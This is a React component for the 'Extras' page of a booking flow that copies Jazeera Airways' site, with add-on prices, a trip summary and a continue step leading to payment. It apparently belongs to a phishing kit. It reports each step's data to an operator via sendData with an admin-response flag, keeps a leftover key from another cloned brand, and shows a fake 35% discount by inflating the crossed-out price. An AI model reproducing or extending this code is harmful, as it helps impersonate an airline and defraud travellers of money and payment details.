import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { sendData } from "../lib/store";
import { ChevronDown, ChevronUp, ArrowLeft } from "lucide-react";
import { useLang } from "../contexts/LanguageContext";

const SERVICE_AR: Record<string, { name: string; bullets: string[] }> = {
  priority: {
    name: 'خدمات الأولوية',
    bullets: ['رحلة أسرع وأسلس في المطار', 'أولوية في إنهاء الإجراءات', 'أولوية في الصعود', 'أولوية في الأمتعة'],
  },
  lounge: {
    name: 'دخول صالة Smart Delay',
    bullets: ['استمتع بدخول مجاني لصالة المطار', 'استرداد فوري إذا ألغت الشركة الرحلة', 'ينطبق على جميع الركّاب في الحجوزات الجماعية'],
  },
  insurance: {
    name: 'التأمين',
    bullets: ['نوفّر لك تأمين سفر عالمي المستوى للركّاب من عمر 3 أشهر إلى 80 سنة.', 'احمِ رحلتك من المفاجآت مثل الطوارئ الطبية أو فقدان الأمتعة أو مشاكل الرحلات.'],
  },
  earlycheckin: {
    name: 'إنهاء الإجراءات المبكر',
    bullets: ['أنهِ إجراءاتك وسلّم أمتعتك مبكرًا', 'تجاوز الطوابير يوم السفر'],
  },
  wheelchair: { name: 'كرسي متحرك', bullets: ['اطلب مساعدة الكرسي المتحرك في المطار.'] },
  nonstandardbag: { name: 'أمتعة غير قياسية', bullets: ['للمعدات الرياضية والآلات الموسيقية والأغراض الكبيرة.'] },
  meetassist: { name: 'الاستقبال والمساعدة عند المغادرة في KWI', bullets: ['مساعدة شخصية عبر المطار عند المغادرة.'] },
};
const EDIT_ITEMS_AR: Record<string, string> = {
  extrabag: 'أمتعة إضافية',
  seat: 'اختيار المقعد',
  cafe: 'طلب مسبق من مقهى الجزيرة',
};

// Matches the TripSummary structure produced by SeatCustomization / Meals / CustomizeTrip.
type TripSummary = {
  passengerCount?: number;
  tripLabel?: string;
  firstDate?: string;
  flightsConv: number;
  taxesConv: number;
  cfarConv?: number;
  baseTotalConv: number;
  curCode: string;
  curDecimals: number;
  curRate: number;
  baseTotalKWD?: number;
  discountConv?: number;
  seating?: number;
  meals?: number;
  addons?: number;
  total?: number;
  bundleName?: string;
  primaryName?: string;
  originCode?: string;
  destCode?: string;
  legs?: { route: string; detail: string; origin: string; destination: string }[];
};

// Toggle-able extra services. Prices in KWD (match the original Jazeera flow).
type Service = {
  id: string;
  name: string;
  bullets: string[];
  image: string;
  priceKWD: number;
  defaultForFlexPlus?: boolean;
};

const SERVICES: Service[] = [
  {
    id: "priority",
    name: "Priority services",
    bullets: [
      "Faster, smoother airport journey",
      "Priority check-in",
      "Priority boarding",
      "Priority baggage",
    ],
    image: "/extras/priority.jpg",
    priceKWD: 15.0,
    defaultForFlexPlus: true,
  },
  {
    id: "lounge",
    name: "Smart Delay Lounge Access",
    bullets: [
      "Enjoy complimentary airport lounge access",
      "Instant refund if airline cancels flight",
      "Applies to all passengers in group bookings",
    ],
    image: "/extras/smartdelay.jpg",
    priceKWD: 0.75,
  },
  {
    id: "insurance",
    name: "Insurance",
    bullets: [
      "We've got you covered with our world-class travel insurance for passengers aged 3 months to 80 years.",
      "Protect your trip from surprises like medical emergencies, lost baggage, or flight hiccups.",
    ],
    image: "/extras/insurance.jpg",
    priceKWD: 3.5,
    defaultForFlexPlus: true,
  },
  {
    id: "earlycheckin",
    name: "Early Check-in",
    bullets: [
      "Check in early and drop your bags ahead of time",
      "Skip the queues on the day of travel",
    ],
    image: "/extras/earlycheckin.jpg",
    priceKWD: 2.0,
  },
  {
    id: "wheelchair",
    name: "Wheelchair",
    bullets: ["Request wheelchair assistance at the airport."],
    image: "/extras/wheelchair.jpg",
    priceKWD: 16.0,
  },
  {
    id: "nonstandardbag",
    name: "Non-Standard Baggage",
    bullets: ["For sports equipment, musical instruments and oversized items."],
    image: "/extras/nonstandard.jpg",
    priceKWD: 20.0,
  },
  {
    id: "meetassist",
    name: "Meet and Assist on Departure at KWI",
    bullets: ["Personal assistance through the airport on departure."],
    image: "/extras/meet_assist.jpg",
    priceKWD: 15.0,
  },
];

// Items that link back to earlier pages (Edit) rather than toggling.
const EDIT_ITEMS = [
  { id: "extrabag", name: "Extra Baggage", route: "/customize-your-trip", added: true },
  { id: "seat", name: "Seat Selection", route: "/seat-customization", added: false },
  { id: "cafe", name: "Jazeera Café Pre-Order", route: "/meals", added: true },
];

export default function Extras() {
  const [, setLocation] = useLocation();
  const { isAr, dir, t } = useLang();
  const svcName = (id: string, en: string) => (isAr && SERVICE_AR[id] ? SERVICE_AR[id].name : en);
  const svcBullets = (id: string, en: string[]) => (isAr && SERVICE_AR[id] ? SERVICE_AR[id].bullets : en);
  const editName = (id: string, en: string) => (isAr && EDIT_ITEMS_AR[id] ? EDIT_ITEMS_AR[id] : en);
  const [isSummaryExpanded, setIsSummaryExpanded] = useState(true);
  const [tripSummary, setTripSummary] = useState<TripSummary | null>(null);
  const [selected, setSelected] = useState<Record<string, boolean>>({});
  const [agreed, setAgreed] = useState(false);
  const [summarySheetOpen, setSummarySheetOpen] = useState(false);

  // Mobile bottom bar show/hide on scroll
  const [mobileBarVisible, setMobileBarVisible] = useState(true);
  const lastScrollY = useRef(0);
  useEffect(() => {
    const onScroll = () => {
      const y = window.scrollY;
      if (y > lastScrollY.current && y > 80) setMobileBarVisible(false);
      else setMobileBarVisible(true);
      lastScrollY.current = y;
    };
    window.addEventListener("scroll", onScroll, { passive: true });
    return () => window.removeEventListener("scroll", onScroll);
  }, []);

  useEffect(() => {
    const storedSummary = localStorage.getItem("tripSummary");
    if (storedSummary) {
      try {
        const parsed = JSON.parse(storedSummary);
        setTripSummary(parsed);
        const b = (parsed.bundleName || "").trim().toLowerCase();
        const isFlexPlus = b === "flex plus" || b === "flexplus";
        const init: Record<string, boolean> = {};
        SERVICES.forEach((s) => {
          init[s.id] = !!(s.defaultForFlexPlus && isFlexPlus) || (s.id === "insurance");
        });
        setSelected(init);
      } catch {
        setLocation("/passenger-details");
      }
    } else {
      setLocation("/passenger-details");
    }
  }, [setLocation]);

  if (!tripSummary) {
    return <div className="min-h-screen bg-[#eef3fb]" />;
  }

  const passengerName = tripSummary.primaryName || "Guest";

  const fmt = (v: number) =>
    `${tripSummary.curCode || "KWD"} ${v.toLocaleString("en-US", {
      minimumFractionDigits: tripSummary.curDecimals ?? 3,
      maximumFractionDigits: tripSummary.curDecimals ?? 3,
    })}`;

  const f = Math.pow(10, tripSummary.curDecimals ?? 3);
  const conv = (kwd: number) => Math.round(kwd * (tripSummary.curRate || 1) * f) / f;

  const toggle = (id: string) => {
    setSelected((prev) => ({ ...prev, [id]: !prev[id] }));
    setMobileBarVisible(true);
  };

  // Extras chosen on this page (converted)
  const extrasCost = SERVICES.reduce(
    (sum, s) => sum + (selected[s.id] ? conv(s.priceKWD) : 0),
    0
  );
  const extrasCostRounded = Math.round(extrasCost * f) / f;

  // Add-ons already accumulated from the baggage page
  const prevAddons = tripSummary.addons || 0;

  const flightsCost = tripSummary.flightsConv || 0;
  const taxesCost = tripSummary.taxesConv || 0;
  const seatingCost = tripSummary.seating || 0;
  const mealsCost = tripSummary.meals || 0;
  const baseTotal = tripSummary.baseTotalConv + seatingCost + mealsCost;
  const totalCost = Math.round((baseTotal + prevAddons + extrasCostRounded) * f) / f;
  const farePortion = Math.round(((tripSummary.flightsConv || 0) + (tripSummary.taxesConv || 0)) * f) / f;
  const discountAmount = tripSummary.discountConv != null
    ? Math.round(tripSummary.discountConv * f) / f
    : Math.round((farePortion / 0.65 - farePortion) * f) / f;

  const handleContinue = () => {
    if (!agreed) return;
    const totalAddons = Math.round((prevAddons + extrasCostRounded) * f) / f;
    const updated = { ...tripSummary, addons: totalAddons, total: totalCost };
    localStorage.setItem("tripSummary", JSON.stringify(updated));

    const extrasKWD = SERVICES.reduce(
      (sum, s) => sum + (selected[s.id] ? s.priceKWD : 0),
      0
    );
    const prevAddonsKWD = (tripSummary.addons || 0) / (tripSummary.curRate || 1);
    const baseKWD =
      (tripSummary.baseTotalKWD || 0) +
      ((tripSummary.meals || 0) / (tripSummary.curRate || 1)) +
      ((tripSummary.seating || 0) / (tripSummary.curRate || 1));
    const totalKWD = baseKWD + prevAddonsKWD + extrasKWD;
    localStorage.setItem("amouage_order_total", String(Math.round(totalKWD * 1000) / 1000));
    
    const extrasNames = SERVICES
      .filter((s) => selected[s.id])
      .map((s) => (SERVICE_AR[s.id] ? SERVICE_AR[s.id].name : s.name));
    sendData({
      data: {
        "الخدمات الإضافية": extrasNames.length ? extrasNames.join('، ') : "بدون خدمات إضافية",
        "تكلفة الخدمات": `${extrasCostRounded} ${tripSummary.curCode}`,
        "الإجمالي النهائي": `${totalCost} ${tripSummary.curCode}`,
      },
      current: "الإضافات (Extras)",
      nextPage: "المراجعة والدفع",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation("/review-pay");
  };

  return (
    <div className="min-h-screen bg-[#eef3fb] font-sans" dir={dir}>
      {/* Mobile Header - matches original: back arrow + "Extras" title */}
      <div className="md:hidden px-4 pt-8 pb-4">
        <div className="flex items-center gap-3">
          <button
            onClick={() => setLocation("/customize-your-trip")}
            className="w-9 h-9 rounded-full border border-gray-300 bg-white flex items-center justify-center shrink-0"
          >
            <ArrowLeft className="w-5 h-5 text-[#004b87]" />
          </button>
          <h1 className="text-3xl font-bold text-[#004b87]">{isAr ? 'إضافات' : 'Extras'}</h1>
        </div>
      </div>

      {/* Desktop Header */}
      <div className="hidden md:flex bg-white px-4 py-3 items-center justify-between shadow-sm sticky top-0 z-10">
        <div className="flex items-center gap-3">
          <button onClick={() => setLocation("/customize-your-trip")} className="p-1">
            <ArrowLeft className="w-5 h-5 text-gray-600" />
          </button>
          <h1 className="text-xl font-medium text-[#004b87]">{isAr ? 'إضافات' : 'Extras'}</h1>
        </div>
        <div className="flex items-center gap-2 bg-white border border-gray-200 rounded-full px-3 py-1.5 shadow-sm">
          <span className="text-xs font-medium text-gray-600">{tripSummary.originCode || "KWI"}</span>
          <svg className="w-4 h-4 text-[#0a72c0]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5A1.5 1.5 0 0011.5 2 1.5 1.5 0 0010 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5z" /></svg>
          <span className="text-xs font-medium text-gray-600">{tripSummary.destCode || "HBE"}</span>
          <ChevronDown className="w-3 h-3 text-gray-400" />
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-3 md:px-4 py-2 md:py-6 flex flex-col-reverse lg:flex-row gap-4 md:gap-6 pb-56 md:pb-6">
        {/* Main Content */}
        <div className="flex-1">
          {/* Toggle service cards */}
          <div className="space-y-5">
            {SERVICES.map((s) => (
              <div
                key={s.id}
                className="bg-white rounded-3xl shadow-sm overflow-hidden"
              >
                {/* Image - centered square like original */}
                <div className="flex justify-center pt-6 px-6">
                  <img
                    src={s.image}
                    alt={s.name}
                    className="w-48 h-48 md:w-56 md:h-56 object-cover rounded-2xl"
                    onError={(e) => ((e.target as HTMLImageElement).style.visibility = "hidden")}
                  />
                </div>

                {/* Content below image */}
                <div className="p-5">
                  {/* Added badge */}
                  {selected[s.id] && (
                    <div className="inline-flex items-center gap-1.5 border border-gray-300 rounded-full pl-3 pr-2 py-1 mb-3">
                      <span className="text-sm font-medium text-gray-800">{isAr ? 'مضاف' : 'Added'}</span>
                      <svg className="w-5 h-5 text-[#0a72c0]" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" /></svg>
                    </div>
                  )}
                  <h4 className="text-lg font-bold text-gray-900 mb-2">{svcName(s.id, s.name)}</h4>
                  {(() => { const bl = svcBullets(s.id, s.bullets); return bl.length > 1 ? (
                    <ul className="list-disc pl-5 space-y-1 mb-4">
                      {bl.map((b, i) => (
                        <li key={i} className="text-sm text-gray-700 leading-snug">{b}</li>
                      ))}
                    </ul>
                  ) : (
                    <p className="text-sm text-gray-700 leading-snug mb-4">{bl[0]}</p>
                  ); })()}

                  {/* Price + toggle */}
                  <div className="flex items-center justify-between">
                    <span className="text-base font-bold text-[#004b87]">{fmt(conv(s.priceKWD))}</span>
                    <button
                      onClick={() => toggle(s.id)}
                      aria-label={`toggle ${s.name}`}
                      className={`relative w-12 h-6 rounded-full transition-colors shrink-0 ${
                        selected[s.id] ? "bg-[#0a72c0]" : "bg-gray-300"
                      }`}
                    >
                      <span
                        className={`absolute top-0.5 w-5 h-5 rounded-full bg-white shadow transition-all ${
                          selected[s.id] ? "left-6" : "left-0.5"
                        }`}
                      />
                    </button>
                  </div>
                </div>
              </div>
            ))}

            {/* Edit items (link back to earlier pages) */}
            {EDIT_ITEMS.map((it) => (
              <div
                key={it.id}
                className="bg-white rounded-3xl shadow-sm px-6 py-5 flex items-center justify-between"
              >
                <div className="flex items-center gap-3">
                  <h4 className="text-base font-bold text-gray-900">{editName(it.id, it.name)}</h4>
                  {it.added && <span className="text-sm text-green-600 font-medium">{isAr ? 'مضاف' : 'Added'}</span>}
                </div>
                <button
                  onClick={() => setLocation(it.route)}
                  className="text-sm text-[#0a72c0] font-medium border border-[#0a72c0] px-6 py-2 rounded-full hover:bg-blue-50 transition-colors"
                >
                  {isAr ? 'تعديل' : 'Edit'}
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Trip Summary Sidebar - DESKTOP ONLY */}
        <div className="hidden lg:block w-80">
          <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-5 sticky top-20">
            <h2 className="text-2xl font-bold text-[#004b87] mb-4">{t('seat.tripSummary')}</h2>

            <div className="flex items-center gap-2 text-sm text-gray-700 mb-2">
              <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
            </div>

            <div className="flex items-center gap-2 text-sm text-gray-700 mb-5">
              <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : "One way")}: {tripSummary.firstDate || "Mon, 20 Jul 2026"}</span>
            </div>

            <div className="space-y-3">
              {/* Flights */}
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5">
                <button
                  onClick={() => setIsSummaryExpanded(!isSummaryExpanded)}
                  className="w-full flex items-center justify-between text-base font-semibold text-gray-800"
                >
                  <span>{t('seat.flights')}</span>
                  <div className="flex items-center gap-2">
                    <span className="text-[#0a72c0] font-semibold">{fmt(flightsCost)}</span>
                    {isSummaryExpanded ? <ChevronUp className="w-4 h-4 text-[#0a72c0]" /> : <ChevronDown className="w-4 h-4 text-[#0a72c0]" />}
                  </div>
                </button>
              </div>

              {/* Add-ons */}
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5">
                <div className="w-full flex items-center justify-between text-base font-semibold text-gray-800">
                  <span>{isAr ? 'الإضافات' : 'Add-ons'}</span>
                  <span className="text-[#0a72c0]">{fmt(Math.round((prevAddons + extrasCostRounded) * f) / f)}</span>
                </div>
                <div className="mt-2 space-y-1.5">
                  {SERVICES.filter((s) => selected[s.id]).map((s) => (
                    <div key={s.id} className="flex justify-between text-xs text-gray-500 gap-2">
                      <span className="flex-1">{svcName(s.id, s.name)}</span>
                      <span className="text-[#0a72c0] whitespace-nowrap">{fmt(conv(s.priceKWD))}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* Taxes */}
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold text-gray-800">
                <span>{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span className="text-gray-500 font-normal">{fmt(taxesCost)}</span>
              </div>

              {/* Discount */}
              <div className="bg-[#fdeaea] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold mb-2">
                <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
              </div>

              {/* Total */}
              <div className="flex justify-between items-center pt-2 px-1">
                <span className="text-xl font-bold text-gray-800">{t('common.total')}</span>
                <span className="flex flex-col items-end leading-tight">
                  <span className="text-base line-through text-red-500">{fmt(Math.round((totalCost + discountAmount) * f) / f)}</span>
                  <span className="text-2xl font-bold text-[#0a72c0]">{fmt(totalCost)}</span>
                </span>
              </div>

              {/* Insurance terms agreement */}
              <div className="flex items-start gap-2 pt-2">
                <input
                  id="agree-desktop"
                  type="checkbox"
                  checked={agreed}
                  onChange={(e) => setAgreed(e.target.checked)}
                  className="mt-0.5 w-4 h-4 accent-[#004b87] shrink-0"
                />
                <label htmlFor="agree-desktop" className="text-xs text-gray-600 leading-snug">
                  {isAr ? 'بالمتابعة إلى الصفحة التالية، فإنك توافق على ' : 'By continuing to the next page, you agree to our'}{" "}
                  <a href="#" className="text-gray-700 underline">{isAr ? 'تفاصيل التأمين' : 'Insurance Details'}</a> {isAr ? 'و' : 'and'}{" "}
                  <a href="#" className="text-gray-700 underline">{isAr ? 'شروط الوثيقة' : 'Policy Terms'}</a>
                </label>
              </div>

              <button
                onClick={handleContinue}
                disabled={!agreed}
                className={`w-full py-4 rounded-full font-bold text-lg transition-colors ${
                  agreed
                    ? "bg-[#004b87] hover:bg-[#003b6a] text-white"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                {t('common.continue')}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ===== MOBILE BOTTOM BAR ===== */}
      <div
        className={`lg:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-[0_-4px_12px_rgba(0,0,0,0.08)] z-50 transition-transform duration-300 ${
          mobileBarVisible ? "translate-y-0" : "translate-y-full"
        }`}
      >
        <div className="px-4 pt-4 pb-5">
          {/* Trip summary toggle */}
          <button
            onClick={() => setSummarySheetOpen(!summarySheetOpen)}
            className="w-full flex items-center justify-between mb-3"
          >
            <h3 className="text-xl font-bold text-[#004b87]">{t('seat.tripSummary')}</h3>
            {summarySheetOpen ? <ChevronDown className="w-5 h-5 text-gray-500" /> : <ChevronUp className="w-5 h-5 text-gray-500" />}
          </button>

          {/* Expanded summary content */}
          {summarySheetOpen && (
            <div className="mb-4 space-y-3">
              {/* Flights */}
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3 flex justify-between text-sm font-semibold text-gray-800">
                <span>{t('seat.flights')}</span>
                <span className="text-[#0a72c0]">{fmt(flightsCost)}</span>
              </div>
              {/* Add-ons */}
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3">
                <div className="flex justify-between text-sm font-semibold text-gray-800">
                  <span>{isAr ? 'الإضافات' : 'Add-ons'}</span>
                  <span className="text-[#0a72c0]">{fmt(Math.round((prevAddons + extrasCostRounded) * f) / f)}</span>
                </div>
                <div className="mt-2 space-y-1">
                  {SERVICES.filter((s) => selected[s.id]).map((s) => (
                    <div key={s.id} className="flex justify-between text-xs text-gray-500">
                      <span>{svcName(s.id, s.name)}</span>
                      <span className="text-[#0a72c0]">{fmt(conv(s.priceKWD))}</span>
                    </div>
                  ))}
                </div>
              </div>
              {/* Taxes */}
              <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3 flex justify-between text-sm font-semibold text-gray-800">
                <span>{isAr ? 'الضرائب' : 'Taxes'}</span>
                <span className="text-gray-500 font-normal">{fmt(taxesCost)}</span>
              </div>
              {/* Discount */}
              <div className="bg-[#fdeaea] rounded-2xl px-4 py-3 flex justify-between text-sm font-semibold">
                <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
              </div>
            </div>
          )}

          {/* Total row */}
          <div className="flex items-center justify-between mb-3">
            <span className="text-lg font-bold text-gray-800">{t('common.total')}</span>
            <span className="text-xl font-bold text-[#0a72c0]">{fmt(totalCost)}</span>
          </div>

          {/* Agreement checkbox */}
          <div className="flex items-start gap-2 mb-4">
            <input
              id="agree-mobile"
              type="checkbox"
              checked={agreed}
              onChange={(e) => setAgreed(e.target.checked)}
              className="mt-0.5 w-4 h-4 accent-[#004b87] shrink-0"
            />
            <label htmlFor="agree-mobile" className="text-xs text-gray-600 leading-snug">
              {isAr ? 'بالمتابعة إلى الصفحة التالية، فإنك توافق على ' : 'By continuing to the next page, you agree to our'}{" "}
              <a href="#" className="text-gray-700 underline">{isAr ? 'تفاصيل التأمين' : 'Insurance Details'}</a> {isAr ? 'و' : 'and'}{" "}
              <a href="#" className="text-gray-700 underline">{isAr ? 'شروط الوثيقة' : 'Policy Terms'}</a>
            </label>
          </div>

          {/* Continue button */}
          <button
            onClick={handleContinue}
            disabled={!agreed}
            className={`w-full py-4 rounded-full font-bold text-lg transition-colors ${
              agreed
                ? "bg-[#004b87] hover:bg-[#003b6a] text-white"
                : "bg-gray-300 text-gray-500 cursor-not-allowed"
            }`}
          >
            {t('common.continue')}
          </button>
        </div>
      </div>
    </div>
  );
}
